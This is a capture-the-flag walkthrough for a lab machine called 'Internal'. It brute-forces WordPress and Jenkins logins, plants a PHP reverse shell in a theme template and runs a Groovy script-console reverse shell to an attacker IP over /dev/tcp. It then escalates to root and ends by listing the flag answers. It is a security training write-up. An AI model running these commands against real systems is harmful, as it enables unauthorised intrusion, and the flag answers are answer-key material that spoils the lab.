# Internal
## 13-07-2022
## level : hard

Machine IP : 10.10.235.184

We have to map the ip to `internal.thm` by using `/etc/hosts` 

Scanning using nmap :
```
nmap -sV 10.10.235.184 -oN service_version.txt
```
Http server is running so, lets run the gobuster
```
gobuster -u http://internal.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 500 | tee directory_list.txt
```

Now if we go to the `/blog` then we can see that this site is a wordpress site.

After some finding we can see one user named `admin` and the login page is also revealed.

Lets now bruteforce the login page using `wpscan`
```
wpscan --url http://internal.thm/blog/ -U admin -P /usr/share/wordlists/rockyou.txt -t 30

```

After getting the password login to the site.

Now copy the php reverse shell
```
cp /usr/share/webshells/php/php-reverse-shell.php .
```
Now lets edit the file with ip and port

go to Appearance > theme edito > theme files > 404 template

then just paste all the content of `php-reverse-shell.php`

Set a netcat listener
```
nc -lvnp 1234
```

Now from the browser run the `404.php` script to get a reverse shell


Finding for any backup file 
```
find / -type f -name "*.txt" 2>/dev/null | less
```

Now inside the `/opt/wp-save.txt` file we got the user password




After getting the user flag we can see that another file is there say that another service is running

So we will use ssh tunnelling to connect to that service from our local machine

```
ssh -L 6767:172.17.0.2:8080 aubreanna@10.10.235.184

```

Now if we open the site using `http://localhost:6767` we can see that the site opens up. 

We will use `hydra` to find the password for the login.

```
hydra 127.0.0.1 -s 6767 -f http-form-post "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password" -l admin -P /usr/share/wordlists/rockyou.txt

```
Now we have got our login credentials. Just login now.

Now as we have the access to the admin account we will try to get a reverse shell from this jenkins server to our local machine.

We will go to `Script Console` by browsing `http://localhost/script` 

Now we use a java reverse shell payload as jenkins run on java. ( change the ip to tun0 ip )
```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.17.48.110/12345;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()

```

Now Start a netcat listener on port `12345`
```
nc -lvnp 12345

```
Now run the script on the jenkins script page 


As we've got a reverse connection now lets stabilize the shell

```
/bin/bash -i
export TERM=xterm-color
python -c 'import pty;pty.spawn("/bin/bash")
```

Now if we look into the `/opt` folder we can see that one text file `note.txt` is there.

After reading this file we can see that there is the credentials for the root user.


Now lets login as the root user.

So in the wp server machine if we login using the credentials. we can get the root flag easilly

```
su root

```

Now read the flag 
```
cat /root/root.txt
```




## Deploy and Engage the Client Environment

| Qu3$t10n$ | 4n$w3r$ |
|-----------|---------|
| User.txt flag | THM{int3rna1_fl4g_1} |
| Root.txt flag | THM{d0ck3r_d3str0y3r}









#    THE END 
